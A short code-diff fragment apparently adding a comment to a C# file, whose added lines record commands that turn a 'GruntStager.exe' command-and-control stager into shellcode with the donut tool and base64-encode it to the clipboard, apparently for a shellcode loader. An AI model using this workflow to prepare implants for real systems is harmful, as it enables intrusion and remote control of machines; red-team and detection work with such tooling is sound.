@@ -1,3 +1,10 @@
+Commands via rasta(Thank you as always rasta): 
+C:\Users\Daniel>D:\Tools\donut\donut.exe -f Downloads\GruntStager.exe -o D:\Tools\GruntStager.bin
+[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("D:\Tools\GruntStager.bin")) | clip
+
+
+
+
 using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
